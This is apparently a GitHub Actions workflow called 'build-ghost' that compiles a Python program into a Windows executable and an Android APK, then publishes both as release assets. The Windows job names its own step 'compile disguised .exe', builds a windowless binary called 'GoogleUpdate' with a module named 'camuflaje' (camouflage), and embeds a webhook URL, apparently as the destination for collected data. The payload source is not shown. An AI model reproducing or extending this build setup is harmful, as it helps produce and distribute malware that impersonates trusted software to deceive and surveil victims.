name: build-ghost

on:
  push:
    branches: [main]
    tags: ["v*"]
  workflow_dispatch:

permissions:
  contents: write

env:
  PYTHONUNBUFFERED: "1"

jobs:
  # ------------------------------ WINDOWS ------------------------------
  windows:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v5

      - uses: actions/setup-python@v6
        with:
          python-version: "3.11"

      - name: Iconos
        run: |
          python -m pip install --upgrade pip pillow
          python tools/make_icons.py

      - name: Webhook por secret (opcional)
        shell: bash
        env:
          WH: ${{ secrets.WEBHOOK_URL }}
        run: |
          if [ -n "$WH" ]; then
            python -c "import os;open('_secret.py','w').write('WEBHOOK_URL = %r\n' % os.environ['WH'])"
            echo "webhook del secret inyectado"
          else
            echo "usando el webhook incrustado en _secret.py"
          fi

      - name: Dependencias
        run: python -m pip install -r requirements.txt pyinstaller

      - name: Compilar .exe disfrazado
        run: >
          pyinstaller --noconfirm --clean --onefile --noconsole
          --name "GoogleUpdate" --icon icon.ico
          --hidden-import _secret --hidden-import camuflaje
          desktop_entry.py

      - uses: actions/upload-artifact@v4
        with:
          name: windows-exe
          path: dist/GoogleUpdate.exe
          if-no-files-found: error

  # ------------------------------ ANDROID ------------------------------
  android:
    runs-on: ubuntu-22.04
    timeout-minutes: 150
    steps:
      - uses: actions/checkout@v5

      - uses: actions/setup-python@v6
        with:
          python-version: "3.11"

      - uses: actions/setup-java@v5
        with:
          distribution: temurin
          java-version: "17"

      - name: Liberar disco
        run: |
          sudo rm -rf /usr/local/lib/android/sdk/ndk \
                      /usr/local/lib/android/sdk/emulator \
                      /usr/local/lib/android/sdk/system-images \
                      /usr/share/dotnet /opt/ghc /usr/local/share/boost || true
          df -h

      - name: Dependencias del sistema
        run: |
          sudo apt-get update
          sudo apt-get install -y git zip unzip curl autoconf libtool pkg-config \
            zlib1g-dev libncurses5-dev libtinfo5 cmake libffi-dev libssl-dev \
            automake build-essential ccache

      - name: Icono
        run: |
          python -m pip install --upgrade pip pillow
          python tools/make_icons.py

      - name: Cache buildozer
        uses: actions/cache@v4
        with:
          path: |
            ~/.buildozer
            ~/.gradle
          key: bz-${{ runner.os }}-${{ hashFiles('buildozer.spec') }}
          restore-keys: bz-${{ runner.os }}-

      - name: Instalar buildozer
        run: |
          python -m pip install --upgrade pip setuptools wheel
          python -m pip install "buildozer==1.5.0" "cython==0.29.36"

      - name: Webhook por secret (opcional)
        env:
          WH: ${{ secrets.WEBHOOK_URL }}
        run: |
          if [ -n "$WH" ]; then
            python -c "import os;open('_secret.py','w').write('WEBHOOK_URL = %r\n' % os.environ['WH'])"
          fi

      - name: Compilar APK (arm64-v8a + armeabi-v7a)
        run: buildozer -v android debug
        env:
          GRADLE_OPTS: "-Xmx2g"

      - name: Verificar ABIs dentro del APK
        run: |
          for f in bin/*.apk; do
            echo "== $f"
            unzip -l "$f" | grep -oE 'lib/(arm64-v8a|armeabi-v7a)/' | sort -u
          done
          ls -lh bin/

      - name: Volcar log si falla
        if: failure()
        run: |
          echo "=========== buildozer.log (ultimas 250 lineas) ==========="
          tail -n 250 ~/.buildozer/buildozer.log || true

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: android-apk
          path: bin/*.apk
          if-no-files-found: warn

  # ------------------------------ RELEASE ------------------------------
  release:
    if: startsWith(github.ref, 'refs/tags/')
    needs: [windows, android]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          path: artifacts
          merge-multiple: true
      - uses: softprops/action-gh-release@v2
        with:
          files: |
            artifacts/*.exe
            artifacts/*.apk
          generate_release_notes: true
